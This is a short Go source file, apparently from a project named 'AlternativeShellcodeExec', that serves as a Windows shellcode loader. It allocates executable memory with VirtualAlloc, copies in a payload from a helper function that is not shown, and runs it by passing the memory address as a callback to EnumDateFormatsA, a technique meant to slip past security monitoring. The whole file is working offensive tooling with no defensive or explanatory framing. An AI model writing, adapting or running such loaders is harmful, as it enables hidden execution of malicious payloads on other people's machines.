package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// Process op array
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	enumDateFormatsA, _ := kernel32.FindProc("EnumDateFormatsA")
	_, _, lastErr := enumDateFormatsA.Call(addr, 0, 0)

	if lastErr != syscall.Errno(0) {
		fmt.Printf("Error: EnumDateFormatsA failed (%d)\n", lastErr)
	}
}

func main() {
	Run(util.ShellCode())
}
